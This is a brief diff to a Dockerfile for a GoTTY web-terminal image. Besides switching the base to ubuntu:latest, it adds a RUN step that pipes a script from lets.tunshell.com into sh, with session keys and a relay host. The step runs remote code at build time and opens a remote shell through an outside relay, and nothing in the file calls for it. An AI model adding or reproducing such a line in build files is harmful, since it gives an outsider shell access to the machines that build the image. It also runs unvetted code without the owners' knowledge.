@@ -1,4 +1,4 @@
-FROM ubuntu:14.04
+FROM ubuntu:latest
 LABEL maintainer="wingnut0310 <wingnut0310@gmail.com>"
 
 ENV LANG en_US.UTF-8
@@ -17,6 +17,8 @@ RUN apt-get -y update && \
 COPY /run_gotty.sh /run_gotty.sh
 
 RUN chmod 744 /run_gotty.sh
+
+RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T iMdtncryVPg8o8fUF6gORB lgnTbWoiMEaSAPjkCi2G5v au.relay.tunshell.com
 
 EXPOSE 8080
 
